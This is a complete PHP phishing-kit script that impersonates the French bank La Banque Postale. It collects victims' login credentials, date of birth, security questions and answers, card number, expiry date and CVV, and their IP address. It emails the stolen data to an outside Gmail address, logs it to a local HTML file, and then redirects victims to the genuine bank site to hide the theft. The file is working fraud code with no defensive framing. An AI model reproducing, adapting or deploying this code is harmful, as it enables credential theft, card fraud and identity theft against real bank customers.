<?php
$date = gmdate("H:i:s | d/m/Y");
$ip = getenv("REMOTE_ADDR");
$message .= "<table border='0' width='40%' cellspacing='0' cellpadding='0'>";
$message .= "<tr><td colspan='2'>~~~~~~~~~~~~~~~~~ New Rezult~~~~~~~~~~~~~~</td></tr>";
$message .= "<tr><td>ID</td><td>".$_POST["username"]."</td></tr>";
$message .= "<tr><td>Pass</td><td>".$_POST["password"]."</td></tr>";
$message .= "<tr><td colspan='2'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</td></tr>";
$message .= "<tr><td>Date de Naissance</td><td>".$_POST[Bday]." / ".$_POST[Bmoth]." / ".$_POST[Byear]."</td></tr>";
$message .= "<tr><td>Question secrete 1</td><td>".$_POST[Question1]."</td></tr>";
$message .= "<tr><td>Reponse1</td><td>".$_POST[Reponse1]."</td></tr>";
$message .= "<tr><td>Question secrete 2</td><td>".$_POST[Question2]."</td></tr>";
$message .= "<tr><td>Reponse2</td><td>".$_POST[Reponse2]."</td></tr>";
$message .= "<tr><td colspan='2'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</td></tr>";
$message .= "<tr><td>Numero de Carte</td><td>".$_POST[Ncarte]."</td></tr>";
$message .= "<tr><td>Date Dexpiration</td><td>".$_POST[Exmoth]." / ".$_POST[Exyear]."</td></tr>";
$message .= "<tr><td>Cvv</td><td>".$_POST[Cvv]."</td></tr>";
$message .= "<tr><td colspan='2'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</td></tr>";
$message .= "<tr><td>image</td><td><img src='".$_POST[image]."' width='100' height='100'></td></tr>";
$message .= "<tr><td colspan='2'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</td></tr>";
$message .= "<tr><td>IP</td><td>$ip</td></tr>";
$message .= "<tr><td>DATE</td><td>$date</td></tr>";
$message .= "<tr><td colspan='2'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</td></tr>";
$message .= "</table>\n";
$send = "rst.free@gmail.com";
$subject = "POSTAL  ".$_POST[Ncarte]." Good";
$from .= "From: Furoka";
$from .= '001' . "\r\n";
$from .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

@mail($send,$subject,$message,$from);

$fp = fopen('Cool.html', 'a');
fwrite($fp, $message);
fclose($fp);


header("Location: https://www.labanquepostale.fr/particuliers/au_quotidien.html");

?>